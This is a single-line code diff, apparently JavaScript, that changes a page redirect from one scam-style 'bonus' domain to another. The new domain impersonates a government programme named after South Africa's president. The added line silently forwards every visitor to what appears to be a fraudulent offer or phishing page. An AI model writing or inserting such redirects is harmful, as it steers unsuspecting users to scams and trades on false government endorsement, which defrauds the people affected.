@@ -1,1 +1,1 @@
-window.location.href = "https://30gbbonus.xyz/felixoffer.html";
+window.location.href = "https://cyril-ramaphosa.govprogram.lat/offer";
